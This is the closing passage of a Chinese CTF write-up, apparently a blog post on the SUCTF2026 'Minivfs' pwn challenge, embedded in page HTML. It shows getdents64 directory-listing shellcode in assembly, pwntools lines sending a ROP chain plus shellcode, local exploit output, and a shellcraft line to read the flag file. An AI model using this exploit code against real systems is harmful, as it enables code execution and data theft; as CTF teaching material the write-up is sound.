r15 */</span><br><span class="line">    mov r15, rax       </span><br><span class="line">    </span><br><span class="line">    /* 在栈上开辟一个缓冲区用于存储 getdents 的结果 */</span><br><span class="line">    sub rsp, 0x1000    /* 4096 字节缓冲区 */</span><br><span class="line">    mov r14, rsp       /* r14 指向缓冲区起始地址 */</span><br><span class="line"></span><br><span class="line">getdents_loop:</span><br><span class="line">    /* 第二步：getdents64(fd, buf, count) */</span><br><span class="line">    mov rdi, r15       /* fd */</span><br><span class="line">    mov rsi, r14       /* buf */</span><br><span class="line">    mov rdx, 0x1000    /* count = 4096 */</span><br><span class="line">    mov rax, 217       /* SYS_getdents64 */</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* 检查返回值，如果 &lt;= 0 则退出 */</span><br><span class="line">    test rax, rax</span><br><span class="line">    jle exit</span><br><span class="line">    </span><br><span class="line">    /* rax 是读取的总字节数，保存到 r13 作为遍历终点 */</span><br><span class="line">    mov r13, rax</span><br><span class="line">    xor r12, r12       /* r12 是当前缓冲区内的偏移量 */</span><br><span class="line"></span><br><span class="line">parse_dirent:</span><br><span class="line">    /* </span><br><span class="line">       linux_dirent64 结构体:</span><br><span class="line">       - d_ino:    8 bytes</span><br><span class="line">       - d_off:    8 bytes</span><br><span class="line">       - d_reclen: 2 bytes (当前项的总长度)</span><br><span class="line">       - d_type:   1 byte</span><br><span class="line">       - d_name:   char[] (文件名起始位置，偏移 19 字节)</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    /* 第三步：write(1, d_name, len) */</span><br><span class="line">    /* 计算文件名地址: buf + offset + 19 */</span><br><span class="line">    lea rsi, [r14 + r12 + 19] </span><br><span class="line">    </span><br><span class="line">    /* 寻找文件名长度 (直到碰到 null 终止符) */</span><br><span class="line">    mov rdi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">find_len:</span><br><span class="line">    cmp byte ptr [rdi + rdx], 0</span><br><span class="line">    je print_name</span><br><span class="line">    inc rdx</span><br><span class="line">    jmp find_len</span><br><span class="line"></span><br><span class="line">print_name:</span><br><span class="line">    mov rdi, 1         /* stdout */</span><br><span class="line">    mov rax, 1         /* SYS_write */</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* 打印一个换行符以便阅读 */</span><br><span class="line">    push 0x0a</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 1</span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    pop rcx</span><br><span class="line"></span><br><span class="line">    /* 移动偏移量 r12 += d_reclen */</span><br><span class="line">    movzx rcx, word ptr [r14 + r12 + 16] /* d_reclen 在偏移 16 处 */</span><br><span class="line">    add r12, rcx</span><br><span class="line">    </span><br><span class="line">    /* 检查是否处理完缓冲区中所有项 */</span><br><span class="line">    cmp r12, r13</span><br><span class="line">    jl parse_dirent</span><br><span class="line">    </span><br><span class="line">    /* 继续调用 getdents 读取剩余项 */</span><br><span class="line">    jmp getdents_loop</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">    mov rax, 60        /* SYS_exit */</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br><span class="line">    &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>最后将ROP_shellcode发送</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload+=shellcode</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>此时可以获得当前目录文件名 (远程环境关了, 我就本地演示了)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">zer00ne@zer00ne-VMware-Virtual-Platform:~/desktop/SUCTF/work$ python3 exp.py </span><br><span class="line">[+] Starting local process &#x27;./pwn&#x27;: pid 48032</span><br><span class="line">[*] &#x27;/home/zer00ne/desktop/SUCTF/work/libc.so.6&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">0x7ffff7c00000</span><br><span class="line">0x55555555c000</span><br><span class="line">0x7ffff7e114c0</span><br><span class="line">0x7fffffffdce8</span><br><span class="line">[*] Paused (press any to continue)</span><br><span class="line">[*] Paused (press any to continue)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &#x27;./pwn&#x27; stopped with exit code 0 (pid 48032)</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">exp.py.back</span><br><span class="line">pwn</span><br><span class="line">.gdb_history</span><br><span class="line">exp.py</span><br><span class="line">gadget.txt</span><br><span class="line">ld-linux-x86-64.so.2</span><br><span class="line">rdx.txt</span><br><span class="line">libc.so.6</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Interrupted</span><br></pre></td></tr></table></figure>
+
+<p>此时获得了文件名后就可以将shellcode修改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=asm(shellcraft.cat(&quot;flag_&lt;hash&gt;&quot;))</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/as.jpg" data-sizes="auto" alt="EzRount" class="lazyload">
+        
+      
+      <a href="/2026/03/17/Ez_Rounter/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          EzRount
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        74.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:57
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF2026-Minivfs"><span class="toc-number">1.</span> <span class="toc-text">SUCTF2026 Minivfs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TOUCH"><span class="toc-number">1.1.1.</span> <span class="toc-text">TOUCH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rm"><span class="toc-number">1.1.2.</span> <span class="toc-text">rm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write"><span class="toc-number">1.1.3.</span> <span class="toc-text">write</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat"><span class="toc-number">1.1.4.</span> <span class="toc-text">cat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">攻击链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.1.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-null"><span class="toc-number">1.2.2.</span> <span class="toc-text">off-by-null</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#largebins-attack"><span class="toc-number">1.2.3.</span> <span class="toc-text">largebins-attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-some"><span class="toc-number">1.2.4.</span> <span class="toc-text">House of some</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getdents64"><span class="toc-number">1.2.5.</span> <span class="toc-text">getdents64</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">24</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "Minivfs",
+          url: "https://khighl.github.io.git/2026/03/18/minivfs/",
+          excerpt: "",
+          description: "",
+          stripContent: "SUCTF2026 Minivfs阻穷西征，岩何越焉？ 题目分析模拟了一套简单的虚拟文件系统 , 包含了几个常用接口 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910",
+          date: "Wed Mar 18 2026 00:00:00 GMT+0800",
+          updated: "Wed Mar 18 2026 21:38:05 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
